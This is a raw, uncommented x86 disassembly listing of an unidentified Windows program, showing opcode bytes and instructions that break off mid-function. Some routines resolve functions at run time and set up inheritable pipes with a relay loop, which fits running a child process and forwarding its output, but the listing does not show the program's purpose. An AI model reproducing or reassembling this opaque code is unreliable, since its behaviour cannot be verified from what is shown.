  4016b2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4016b5:	50                   	push   %eax
  4016b6:	ff 15 98 d1 40 00    	call   *0x40d198
  4016bc:	0f b7 45 fe          	movzwl -0x2(%ebp),%eax
  4016c0:	57                   	push   %edi
  4016c1:	50                   	push   %eax
  4016c2:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  4016c6:	50                   	push   %eax
  4016c7:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4016ca:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  4016ce:	50                   	push   %eax
  4016cf:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  4016d3:	50                   	push   %eax
  4016d4:	8d 45 0b             	lea    0xb(%ebp),%eax
  4016d7:	68 f4 d4 40 00       	push   $0x40d4f4
  4016dc:	50                   	push   %eax
  4016dd:	68 b0 d4 40 00       	push   $0x40d4b0
  4016e2:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4016e8:	50                   	push   %eax
  4016e9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4016ec:	50                   	push   %eax
  4016ed:	e8 ae af 00 00       	call   0x40c6a0
  4016f2:	83 c4 0c             	add    $0xc,%esp
  4016f5:	8b c8                	mov    %eax,%ecx
  4016f7:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4016fd:	50                   	push   %eax
  4016fe:	ff 15 74 d3 40 00    	call   *0x40d374
  401704:	83 c4 18             	add    $0x18,%esp
  401707:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40170a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401710:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401713:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401719:	83 66 40 00          	andl   $0x0,0x40(%esi)
  40171d:	89 7e 3c             	mov    %edi,0x3c(%esi)
  401720:	b0 01                	mov    $0x1,%al
  401722:	5f                   	pop    %edi
  401723:	eb 02                	jmp    0x401727
  401725:	32 c0                	xor    %al,%al
  401727:	5e                   	pop    %esi
  401728:	c9                   	leave
  401729:	c2 04 00             	ret    $0x4
  40172c:	55                   	push   %ebp
  40172d:	8b ec                	mov    %esp,%ebp
  40172f:	51                   	push   %ecx
  401730:	56                   	push   %esi
  401731:	8b f1                	mov    %ecx,%esi
  401733:	80 7e 38 00          	cmpb   $0x0,0x38(%esi)
  401737:	74 3e                	je     0x401777
  401739:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  40173d:	75 30                	jne    0x40176f
  40173f:	83 ec 10             	sub    $0x10,%esp
  401742:	8d 45 0b             	lea    0xb(%ebp),%eax
  401745:	8b cc                	mov    %esp,%ecx
  401747:	50                   	push   %eax
  401748:	68 20 d5 40 00       	push   $0x40d520
  40174d:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401753:	83 ec 10             	sub    $0x10,%esp
  401756:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401759:	8b cc                	mov    %esp,%ecx
  40175b:	50                   	push   %eax
  40175c:	68 18 d5 40 00       	push   $0x40d518
  401761:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401767:	e8 84 94 00 00       	call   0x40abf0
  40176c:	83 c4 20             	add    $0x20,%esp
  40176f:	c6 46 39 01          	movb   $0x1,0x39(%esi)
  401773:	b0 01                	mov    $0x1,%al
  401775:	eb 02                	jmp    0x401779
  401777:	32 c0                	xor    %al,%al
  401779:	5e                   	pop    %esi
  40177a:	c9                   	leave
  40177b:	c2 04 00             	ret    $0x4
  40177e:	55                   	push   %ebp
  40177f:	8b ec                	mov    %esp,%ebp
  401781:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401784:	e8 04 00 00 00       	call   0x40178d
  401789:	5d                   	pop    %ebp
  40178a:	c2 04 00             	ret    $0x4
  40178d:	55                   	push   %ebp
  40178e:	8b ec                	mov    %esp,%ebp
  401790:	83 ec 34             	sub    $0x34,%esp
  401793:	53                   	push   %ebx
  401794:	56                   	push   %esi
  401795:	8b f1                	mov    %ecx,%esi
  401797:	33 db                	xor    %ebx,%ebx
  401799:	39 5e 3c             	cmp    %ebx,0x3c(%esi)
  40179c:	89 5e 40             	mov    %ebx,0x40(%esi)
  40179f:	76 1f                	jbe    0x4017c0
  4017a1:	38 5e 39             	cmp    %bl,0x39(%esi)
  4017a4:	0f 85 90 00 00 00    	jne    0x40183a
  4017aa:	68 e8 03 00 00       	push   $0x3e8
  4017af:	ff 15 94 d1 40 00    	call   *0x40d194
  4017b5:	ff 46 40             	incl   0x40(%esi)
  4017b8:	8b 46 40             	mov    0x40(%esi),%eax
  4017bb:	3b 46 3c             	cmp    0x3c(%esi),%eax
  4017be:	72 e1                	jb     0x4017a1
  4017c0:	38 5e 39             	cmp    %bl,0x39(%esi)
  4017c3:	75 75                	jne    0x40183a
  4017c5:	38 1d 18 1a 41 00    	cmp    %bl,0x411a18
  4017cb:	74 66                	je     0x401833
  4017cd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4017d0:	50                   	push   %eax
  4017d1:	ff 15 98 d1 40 00    	call   *0x40d198
  4017d7:	0f b7 45 fa          	movzwl -0x6(%ebp),%eax
  4017db:	50                   	push   %eax
  4017dc:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  4017df:	0f b7 45 f8          	movzwl -0x8(%ebp),%eax
  4017e3:	50                   	push   %eax
  4017e4:	0f b7 45 f6          	movzwl -0xa(%ebp),%eax
  4017e8:	50                   	push   %eax
  4017e9:	0f b7 45 f4          	movzwl -0xc(%ebp),%eax
  4017ed:	50                   	push   %eax
  4017ee:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4017f1:	68 58 d5 40 00       	push   $0x40d558
  4017f6:	50                   	push   %eax
  4017f7:	68 34 d5 40 00       	push   $0x40d534
  4017fc:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401802:	50                   	push   %eax
  401803:	8d 45 dc             	lea    -0x24(%ebp),%eax
  401806:	50                   	push   %eax
  401807:	e8 94 ae 00 00       	call   0x40c6a0
  40180c:	83 c4 0c             	add    $0xc,%esp
  40180f:	8b c8                	mov    %eax,%ecx
  401811:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401817:	50                   	push   %eax
  401818:	ff 15 74 d3 40 00    	call   *0x40d374
  40181e:	83 c4 14             	add    $0x14,%esp
  401821:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401824:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40182a:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40182d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401833:	8b ce                	mov    %esi,%ecx
  401835:	e8 22 f9 ff ff       	call   0x40115c
  40183a:	88 5e 38             	mov    %bl,0x38(%esi)
  40183d:	88 5e 39             	mov    %bl,0x39(%esi)
  401840:	5e                   	pop    %esi
  401841:	33 c0                	xor    %eax,%eax
  401843:	5b                   	pop    %ebx
  401844:	c9                   	leave
  401845:	c3                   	ret
  401846:	e8 05 00 00 00       	call   0x401850
  40184b:	e9 0d 00 00 00       	jmp    0x40185d
  401850:	6a 00                	push   $0x0
  401852:	b9 a0 15 41 00       	mov    $0x4115a0,%ecx
  401857:	e8 1c f8 ff ff       	call   0x401078
  40185c:	c3                   	ret
  40185d:	68 69 18 40 00       	push   $0x401869
  401862:	e8 51 ab 00 00       	call   0x40c3b8
  401867:	59                   	pop    %ecx
  401868:	c3                   	ret
  401869:	b9 a0 15 41 00       	mov    $0x4115a0,%ecx
  40186e:	e9 f8 f8 ff ff       	jmp    0x40116b
  401873:	e8 05 00 00 00       	call   0x40187d
  401878:	e9 15 00 00 00       	jmp    0x401892
  40187d:	55                   	push   %ebp
  40187e:	8b ec                	mov    %esp,%ebp
  401880:	51                   	push   %ecx
  401881:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401884:	b9 90 15 41 00       	mov    $0x411590,%ecx
  401889:	50                   	push   %eax
  40188a:	ff 15 dc d2 40 00    	call   *0x40d2dc
  401890:	c9                   	leave
  401891:	c3                   	ret
  401892:	68 9e 18 40 00       	push   $0x40189e
  401897:	e8 1c ab 00 00       	call   0x40c3b8
  40189c:	59                   	pop    %ecx
  40189d:	c3                   	ret
  40189e:	b9 90 15 41 00       	mov    $0x411590,%ecx
  4018a3:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  4018a9:	55                   	push   %ebp
  4018aa:	8b ec                	mov    %esp,%ebp
  4018ac:	53                   	push   %ebx
  4018ad:	56                   	push   %esi
  4018ae:	8d 45 08             	lea    0x8(%ebp),%eax
  4018b1:	57                   	push   %edi
  4018b2:	50                   	push   %eax
  4018b3:	b9 90 15 41 00       	mov    $0x411590,%ecx
  4018b8:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  4018be:	bb a0 15 41 00       	mov    $0x4115a0,%ebx
  4018c3:	8b cb                	mov    %ebx,%ecx
  4018c5:	e8 d6 f7 ff ff       	call   0x4010a0
  4018ca:	83 ec 10             	sub    $0x10,%esp
  4018cd:	be 78 11 41 00       	mov    $0x411178,%esi
  4018d2:	8b fc                	mov    %esp,%edi
  4018d4:	8b cb                	mov    %ebx,%ecx
  4018d6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4018d7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4018d8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4018d9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4018da:	e8 24 f8 ff ff       	call   0x401103
  4018df:	80 3d e4 15 41 00 00 	cmpb   $0x0,0x4115e4
  4018e6:	74 13                	je     0x4018fb
  4018e8:	83 ec 10             	sub    $0x10,%esp
  4018eb:	8d 45 08             	lea    0x8(%ebp),%eax
  4018ee:	8b cc                	mov    %esp,%ecx
  4018f0:	50                   	push   %eax
  4018f1:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4018f7:	6a 74                	push   $0x74
  4018f9:	eb 11                	jmp    0x40190c
  4018fb:	83 ec 10             	sub    $0x10,%esp
  4018fe:	8d 45 08             	lea    0x8(%ebp),%eax
  401901:	8b cc                	mov    %esp,%ecx
  401903:	50                   	push   %eax
  401904:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40190a:	6a 73                	push   $0x73
  40190c:	8b cb                	mov    %ebx,%ecx
  40190e:	e8 17 f8 ff ff       	call   0x40112a
  401913:	6a 01                	push   $0x1
  401915:	68 3a 19 40 00       	push   $0x40193a
  40191a:	8b cb                	mov    %ebx,%ecx
  40191c:	e8 90 f8 ff ff       	call   0x4011b1
  401921:	a1 f0 15 41 00       	mov    0x4115f0,%eax
  401926:	85 c0                	test   %eax,%eax
  401928:	74 02                	je     0x40192c
  40192a:	ff d0                	call   *%eax
  40192c:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40192f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401935:	5f                   	pop    %edi
  401936:	5e                   	pop    %esi
  401937:	5b                   	pop    %ebx
  401938:	5d                   	pop    %ebp
  401939:	c3                   	ret
  40193a:	55                   	push   %ebp
  40193b:	8b ec                	mov    %esp,%ebp
  40193d:	83 ec 74             	sub    $0x74,%esp
  401940:	53                   	push   %ebx
  401941:	56                   	push   %esi
  401942:	57                   	push   %edi
  401943:	8b 7d 08             	mov    0x8(%ebp),%edi
  401946:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401949:	8d 47 18             	lea    0x18(%edi),%eax
  40194c:	50                   	push   %eax
  40194d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  401953:	ff 77 28             	push   0x28(%edi)
  401956:	ff 15 88 d1 40 00    	call   *0x40d188
  40195c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40195f:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401965:	8b 30                	mov    (%eax),%esi
  401967:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  40196c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40196f:	ff 30                	push   (%eax)
  401971:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401974:	6a 04                	push   $0x4
  401976:	50                   	push   %eax
  401977:	ff 15 cc d2 40 00    	call   *0x40d2cc
  40197d:	83 ec 10             	sub    $0x10,%esp
  401980:	8b cc                	mov    %esp,%ecx
  401982:	68 68 11 41 00       	push   $0x411168
  401987:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40198d:	83 ec 10             	sub    $0x10,%esp
  401990:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401993:	8b cc                	mov    %esp,%ecx
  401995:	50                   	push   %eax
  401996:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40199c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40199f:	50                   	push   %eax
  4019a0:	e8 48 9a 00 00       	call   0x40b3ed
  4019a5:	83 c4 24             	add    $0x24,%esp
  4019a8:	83 ee 3a             	sub    $0x3a,%esi
  4019ab:	0f 84 a5 00 00 00    	je     0x401a56
  4019b1:	4e                   	dec    %esi
  4019b2:	0f 85 57 01 00 00    	jne    0x401b0f
  4019b8:	33 f6                	xor    %esi,%esi
  4019ba:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4019bd:	56                   	push   %esi
  4019be:	e8 9c 01 00 00       	call   0x401b5f
  4019c3:	50                   	push   %eax
  4019c4:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4019c7:	50                   	push   %eax
  4019c8:	e8 2d 99 00 00       	call   0x40b2fa
  4019cd:	59                   	pop    %ecx
  4019ce:	59                   	pop    %ecx
  4019cf:	8b c8                	mov    %eax,%ecx
  4019d1:	ff 15 98 d2 40 00    	call   *0x40d298
  4019d7:	50                   	push   %eax
  4019d8:	ff 15 e8 15 41 00    	call   *0x4115e8
  4019de:	59                   	pop    %ecx
  4019df:	8b d8                	mov    %eax,%ebx
  4019e1:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4019e4:	ff 15 9c d2 40 00    	call   *0x40d29c
  4019ea:	3b de                	cmp    %esi,%ebx
  4019ec:	0f 84 1d 01 00 00    	je     0x401b0f
  4019f2:	8d 45 0b             	lea    0xb(%ebp),%eax
  4019f5:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4019f8:	50                   	push   %eax
  4019f9:	68 a8 d5 40 00       	push   $0x40d5a8
  4019fe:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  401a04:	83 ec 10             	sub    $0x10,%esp
  401a07:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401a0a:	8b c4                	mov    %esp,%eax
  401a0c:	51                   	push   %ecx
  401a0d:	50                   	push   %eax
  401a0e:	e8 bb 98 00 00       	call   0x40b2ce
  401a13:	59                   	pop    %ecx
  401a14:	59                   	pop    %ecx
  401a15:	6a 3b                	push   $0x3b
  401a17:	8b cf                	mov    %edi,%ecx
  401a19:	e8 0c f7 ff ff       	call   0x40112a
  401a1e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  401a21:	ff 15 9c d2 40 00    	call   *0x40d29c
  401a27:	56                   	push   %esi
  401a28:	56                   	push   %esi
  401a29:	8d 45 8c             	lea    -0x74(%ebp),%eax
  401a2c:	56                   	push   %esi
  401a2d:	50                   	push   %eax
  401a2e:	ff 15 20 d4 40 00    	call   *0x40d420
  401a34:	3b c6                	cmp    %esi,%eax
  401a36:	7e 16                	jle    0x401a4e
  401a38:	8d 45 8c             	lea    -0x74(%ebp),%eax
  401a3b:	50                   	push   %eax
  401a3c:	ff 15 10 d4 40 00    	call   *0x40d410
  401a42:	8d 45 8c             	lea    -0x74(%ebp),%eax
  401a45:	50                   	push   %eax
  401a46:	ff 15 1c d4 40 00    	call   *0x40d41c
  401a4c:	eb d9                	jmp    0x401a27
  401a4e:	0f 8d bb 00 00 00    	jge    0x401b0f
  401a54:	eb d1                	jmp    0x401a27
  401a56:	33 f6                	xor    %esi,%esi
  401a58:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401a5b:	56                   	push   %esi
  401a5c:	e8 fe 00 00 00       	call   0x401b5f
  401a61:	8b c8                	mov    %eax,%ecx
  401a63:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  401a69:	50                   	push   %eax
  401a6a:	e8 e2 23 00 00       	call   0x403e51
  401a6f:	8b d8                	mov    %eax,%ebx
  401a71:	59                   	pop    %ecx
  401a72:	3b de                	cmp    %esi,%ebx
  401a74:	0f 84 95 00 00 00    	je     0x401b0f
  401a7a:	68 98 d5 40 00       	push   $0x40d598
  401a7f:	53                   	push   %ebx
  401a80:	e8 26 26 00 00       	call   0x4040ab
  401a85:	68 8c d5 40 00       	push   $0x40d58c
  401a8a:	53                   	push   %ebx
  401a8b:	a3 e8 15 41 00       	mov    %eax,0x4115e8
  401a90:	e8 16 26 00 00       	call   0x4040ab
  401a95:	68 80 d5 40 00       	push   $0x40d580
  401a9a:	53                   	push   %ebx
  401a9b:	a3 ec 15 41 00       	mov    %eax,0x4115ec
  401aa0:	e8 06 26 00 00       	call   0x4040ab
  401aa5:	83 c4 08             	add    $0x8,%esp
  401aa8:	a3 f0 15 41 00       	mov    %eax,0x4115f0
  401aad:	8b cc                	mov    %esp,%ecx
  401aaf:	c6 05 e4 15 41 00 01 	movb   $0x1,0x4115e4
  401ab6:	68 90 15 41 00       	push   $0x411590
  401abb:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  401ac1:	6a 74                	push   $0x74
  401ac3:	8b cf                	mov    %edi,%ecx
  401ac5:	e8 60 f6 ff ff       	call   0x40112a
  401aca:	56                   	push   %esi
  401acb:	56                   	push   %esi
  401acc:	56                   	push   %esi
  401acd:	ff 15 8c d1 40 00    	call   *0x40d18c
  401ad3:	8b d8                	mov    %eax,%ebx
  401ad5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401ad8:	50                   	push   %eax
  401ad9:	53                   	push   %ebx
  401ada:	ff 15 ec 15 41 00    	call   *0x4115ec
  401ae0:	59                   	pop    %ecx
  401ae1:	3b c6                	cmp    %esi,%eax
  401ae3:	59                   	pop    %ecx
  401ae4:	74 e4                	je     0x401aca
  401ae6:	83 ec 10             	sub    $0x10,%esp
  401ae9:	8d 55 ff             	lea    -0x1(%ebp),%edx
  401aec:	8b cc                	mov    %esp,%ecx
  401aee:	52                   	push   %edx
  401aef:	50                   	push   %eax
  401af0:	ff 75 f8             	push   -0x8(%ebp)
  401af3:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  401af9:	6a 3b                	push   $0x3b
  401afb:	8b cf                	mov    %edi,%ecx
  401afd:	e8 28 f6 ff ff       	call   0x40112a
  401b02:	ff 75 f8             	push   -0x8(%ebp)
  401b05:	56                   	push   %esi
  401b06:	53                   	push   %ebx
  401b07:	ff 15 90 d1 40 00    	call   *0x40d190
  401b0d:	eb bb                	jmp    0x401aca
  401b0f:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401b12:	e8 19 00 00 00       	call   0x401b30
  401b17:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  401b1a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401b20:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401b23:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401b29:	5f                   	pop    %edi
  401b2a:	5e                   	pop    %esi
  401b2b:	33 c0                	xor    %eax,%eax
  401b2d:	5b                   	pop    %ebx
  401b2e:	c9                   	leave
  401b2f:	c3                   	ret
  401b30:	56                   	push   %esi
  401b31:	8b f1                	mov    %ecx,%esi
  401b33:	ff 76 08             	push   0x8(%esi)
  401b36:	ff 76 04             	push   0x4(%esi)
  401b39:	e8 64 00 00 00       	call   0x401ba2
  401b3e:	8b 46 04             	mov    0x4(%esi),%eax
  401b41:	8b 4e 0c             	mov    0xc(%esi),%ecx
  401b44:	2b c8                	sub    %eax,%ecx
  401b46:	c1 f9 04             	sar    $0x4,%ecx
  401b49:	51                   	push   %ecx
  401b4a:	50                   	push   %eax
  401b4b:	8b ce                	mov    %esi,%ecx
  401b4d:	e8 30 22 00 00       	call   0x403d82
  401b52:	33 c0                	xor    %eax,%eax
  401b54:	89 46 04             	mov    %eax,0x4(%esi)
  401b57:	89 46 08             	mov    %eax,0x8(%esi)
  401b5a:	89 46 0c             	mov    %eax,0xc(%esi)
  401b5d:	5e                   	pop    %esi
  401b5e:	c3                   	ret
  401b5f:	55                   	push   %ebp
  401b60:	8b ec                	mov    %esp,%ebp
  401b62:	56                   	push   %esi
  401b63:	57                   	push   %edi
  401b64:	8b f9                	mov    %ecx,%edi
  401b66:	e8 24 00 00 00       	call   0x401b8f
  401b6b:	8b 75 08             	mov    0x8(%ebp),%esi
  401b6e:	3b c6                	cmp    %esi,%eax
  401b70:	77 07                	ja     0x401b79
  401b72:	8b cf                	mov    %edi,%ecx
  401b74:	e8 4b 00 00 00       	call   0x401bc4
  401b79:	8b cf                	mov    %edi,%ecx
  401b7b:	e8 0b 00 00 00       	call   0x401b8b
  401b80:	c1 e6 04             	shl    $0x4,%esi
  401b83:	03 c6                	add    %esi,%eax
  401b85:	5f                   	pop    %edi
  401b86:	5e                   	pop    %esi
  401b87:	5d                   	pop    %ebp
  401b88:	c2 04 00             	ret    $0x4
  401b8b:	8b 41 04             	mov    0x4(%ecx),%eax
  401b8e:	c3                   	ret
  401b8f:	8b 51 04             	mov    0x4(%ecx),%edx
  401b92:	85 d2                	test   %edx,%edx
  401b94:	75 03                	jne    0x401b99
  401b96:	33 c0                	xor    %eax,%eax
  401b98:	c3                   	ret
  401b99:	8b 41 08             	mov    0x8(%ecx),%eax
  401b9c:	2b c2                	sub    %edx,%eax
  401b9e:	c1 f8 04             	sar    $0x4,%eax
  401ba1:	c3                   	ret
  401ba2:	55                   	push   %ebp
  401ba3:	8b ec                	mov    %esp,%ebp
  401ba5:	56                   	push   %esi
  401ba6:	8b 75 08             	mov    0x8(%ebp),%esi
  401ba9:	57                   	push   %edi
  401baa:	8b f9                	mov    %ecx,%edi
  401bac:	3b 75 0c             	cmp    0xc(%ebp),%esi
  401baf:	74 0d                	je     0x401bbe
  401bb1:	56                   	push   %esi
  401bb2:	8b cf                	mov    %edi,%ecx
  401bb4:	e8 3e 00 00 00       	call   0x401bf7
  401bb9:	83 c6 10             	add    $0x10,%esi
  401bbc:	eb ee                	jmp    0x401bac
  401bbe:	5f                   	pop    %edi
  401bbf:	5e                   	pop    %esi
  401bc0:	5d                   	pop    %ebp
  401bc1:	c2 08 00             	ret    $0x8
  401bc4:	55                   	push   %ebp
  401bc5:	8b ec                	mov    %esp,%ebp
  401bc7:	83 ec 30             	sub    $0x30,%esp
  401bca:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401bcd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401bd0:	50                   	push   %eax
  401bd1:	68 ac d5 40 00       	push   $0x40d5ac
  401bd6:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  401bdc:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401bdf:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401be2:	50                   	push   %eax
  401be3:	ff 15 84 d2 40 00    	call   *0x40d284
  401be9:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401bec:	68 f0 e0 40 00       	push   $0x40e0f0
  401bf1:	50                   	push   %eax
  401bf2:	e8 f5 a7 00 00       	call   0x40c3ec
  401bf7:	55                   	push   %ebp
  401bf8:	8b ec                	mov    %esp,%ebp
  401bfa:	ff 75 08             	push   0x8(%ebp)
  401bfd:	e8 05 00 00 00       	call   0x401c07
  401c02:	59                   	pop    %ecx
  401c03:	5d                   	pop    %ebp
  401c04:	c2 04 00             	ret    $0x4
  401c07:	55                   	push   %ebp
  401c08:	8b ec                	mov    %esp,%ebp
  401c0a:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401c0d:	6a 00                	push   $0x0
  401c0f:	e8 02 00 00 00       	call   0x401c16
  401c14:	5d                   	pop    %ebp
  401c15:	c3                   	ret
  401c16:	55                   	push   %ebp
  401c17:	8b ec                	mov    %esp,%ebp
  401c19:	56                   	push   %esi
  401c1a:	8b f1                	mov    %ecx,%esi
  401c1c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  401c22:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  401c26:	74 07                	je     0x401c2f
  401c28:	56                   	push   %esi
  401c29:	e8 c4 a7 00 00       	call   0x40c3f2
  401c2e:	59                   	pop    %ecx
  401c2f:	8b c6                	mov    %esi,%eax
  401c31:	5e                   	pop    %esi
  401c32:	5d                   	pop    %ebp
  401c33:	c2 04 00             	ret    $0x4
  401c36:	e8 05 00 00 00       	call   0x401c40
  401c3b:	e9 15 00 00 00       	jmp    0x401c55
  401c40:	55                   	push   %ebp
  401c41:	8b ec                	mov    %esp,%ebp
  401c43:	51                   	push   %ecx
  401c44:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401c47:	b9 b8 16 41 00       	mov    $0x4116b8,%ecx
  401c4c:	50                   	push   %eax
  401c4d:	ff 15 dc d2 40 00    	call   *0x40d2dc
  401c53:	c9                   	leave
  401c54:	c3                   	ret
  401c55:	68 61 1c 40 00       	push   $0x401c61
  401c5a:	e8 59 a7 00 00       	call   0x40c3b8
  401c5f:	59                   	pop    %ecx
  401c60:	c3                   	ret
  401c61:	b9 b8 16 41 00       	mov    $0x4116b8,%ecx
  401c66:	ff 25 d8 d2 40 00    	jmp    *0x40d2d8
  401c6c:	55                   	push   %ebp
  401c6d:	8b ec                	mov    %esp,%ebp
  401c6f:	83 ec 48             	sub    $0x48,%esp
  401c72:	f6 05 b4 16 41 00 01 	testb  $0x1,0x4116b4
  401c79:	53                   	push   %ebx
  401c7a:	56                   	push   %esi
  401c7b:	57                   	push   %edi
  401c7c:	bb 58 16 41 00       	mov    $0x411658,%ebx
  401c81:	75 1e                	jne    0x401ca1
  401c83:	80 0d b4 16 41 00 01 	orb    $0x1,0x4116b4
  401c8a:	33 f6                	xor    %esi,%esi
  401c8c:	56                   	push   %esi
  401c8d:	8b cb                	mov    %ebx,%ecx
  401c8f:	e8 e4 f3 ff ff       	call   0x401078
  401c94:	68 6b 20 40 00       	push   $0x40206b
  401c99:	e8 1a a7 00 00       	call   0x40c3b8
  401c9e:	59                   	pop    %ecx
  401c9f:	eb 02                	jmp    0x401ca3
  401ca1:	33 f6                	xor    %esi,%esi
  401ca3:	f6 05 b4 16 41 00 02 	testb  $0x2,0x4116b4
  401caa:	75 25                	jne    0x401cd1
  401cac:	80 0d b4 16 41 00 02 	orb    $0x2,0x4116b4
  401cb3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401cb6:	bf a0 16 41 00       	mov    $0x4116a0,%edi
  401cbb:	50                   	push   %eax
  401cbc:	8b cf                	mov    %edi,%ecx
  401cbe:	ff 15 dc d2 40 00    	call   *0x40d2dc
  401cc4:	68 60 20 40 00       	push   $0x402060
  401cc9:	e8 ea a6 00 00       	call   0x40c3b8
  401cce:	59                   	pop    %ecx
  401ccf:	eb 05                	jmp    0x401cd6
  401cd1:	bf a0 16 41 00       	mov    $0x4116a0,%edi
  401cd6:	8d 45 ff             	lea    -0x1(%ebp),%eax
  401cd9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  401cdc:	50                   	push   %eax
  401cdd:	ff 15 dc d2 40 00    	call   *0x40d2dc
  401ce3:	83 4d f0 ff          	orl    $0xffffffff,-0x10(%ebp)
  401ce7:	80 3d e0 16 41 00 00 	cmpb   $0x0,0x4116e0
  401cee:	89 75 f4             	mov    %esi,-0xc(%ebp)
  401cf1:	0f 85 71 01 00 00    	jne    0x401e68
  401cf7:	68 dc d5 40 00       	push   $0x40d5dc
  401cfc:	68 b8 16 41 00       	push   $0x4116b8
  401d01:	ff 15 74 d2 40 00    	call   *0x40d274
  401d07:	59                   	pop    %ecx
  401d08:	84 c0                	test   %al,%al
  401d0a:	59                   	pop    %ecx
  401d0b:	0f 84 4a 01 00 00    	je     0x401e5b
  401d11:	68 d0 d5 40 00       	push   $0x40d5d0
  401d16:	ff 15 64 d3 40 00    	call   *0x40d364
  401d1c:	59                   	pop    %ecx
  401d1d:	50                   	push   %eax
  401d1e:	8b cf                	mov    %edi,%ecx
  401d20:	ff 15 78 d2 40 00    	call   *0x40d278
  401d26:	68 cc d5 40 00       	push   $0x40d5cc
  401d2b:	8b cf                	mov    %edi,%ecx
  401d2d:	ff 15 7c d2 40 00    	call   *0x40d27c
  401d33:	8b 3d 70 d1 40 00    	mov    0x40d170,%edi
  401d39:	56                   	push   %esi
  401d3a:	68 48 16 41 00       	push   $0x411648
  401d3f:	68 c8 16 41 00       	push   $0x4116c8
  401d44:	68 f8 15 41 00       	push   $0x4115f8
  401d49:	c7 05 48 16 41 00 0c 	movl   $0xc,0x411648
  401d50:	00 00 00 
  401d53:	c7 05 50 16 41 00 01 	movl   $0x1,0x411650
  401d5a:	00 00 00 
  401d5d:	89 35 4c 16 41 00    	mov    %esi,0x41164c
  401d63:	ff d7                	call   *%edi
  401d65:	85 c0                	test   %eax,%eax
  401d67:	0f 84 a1 01 00 00    	je     0x401f0e
  401d6d:	56                   	push   %esi
  401d6e:	68 48 16 41 00       	push   $0x411648
  401d73:	68 cc 16 41 00       	push   $0x4116cc
  401d78:	68 b0 16 41 00       	push   $0x4116b0
  401d7d:	ff d7                	call   *%edi
  401d7f:	85 c0                	test   %eax,%eax
  401d81:	0f 84 87 01 00 00    	je     0x401f0e
  401d87:	6a 11                	push   $0x11
  401d89:	ba 00 16 41 00       	mov    $0x411600,%edx
  401d8e:	59                   	pop    %ecx
  401d8f:	33 c0                	xor    %eax,%eax
  401d91:	8b fa                	mov    %edx,%edi
  401d93:	68 d0 16 41 00       	push   $0x4116d0
  401d98:	f3 ab                	rep stos %eax,%es:(%edi)
  401d9a:	a1 f8 15 41 00       	mov    0x4115f8,%eax
